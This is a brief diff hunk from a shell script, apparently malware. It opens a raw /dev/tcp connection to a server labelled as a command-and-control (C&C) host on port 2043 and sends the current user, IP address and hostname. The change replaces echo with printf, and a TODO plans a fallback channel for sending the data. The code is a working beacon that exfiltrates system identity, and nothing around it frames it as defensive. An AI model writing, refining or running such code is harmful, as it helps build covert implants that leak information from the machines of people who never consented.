@@ -23,7 +23,7 @@ PORT=2043
 
 # Send data to C&C
 exec 3<>/dev/tcp/${SERVER}/${PORT}
-echo "${USER} ${IP} ${HOSTNAME}" >&3
+printf "${USER} ${IP} ${HOSTNAME}" >&3
 
 # Print response
 # TODO: If there's no response, we should send data in some other way
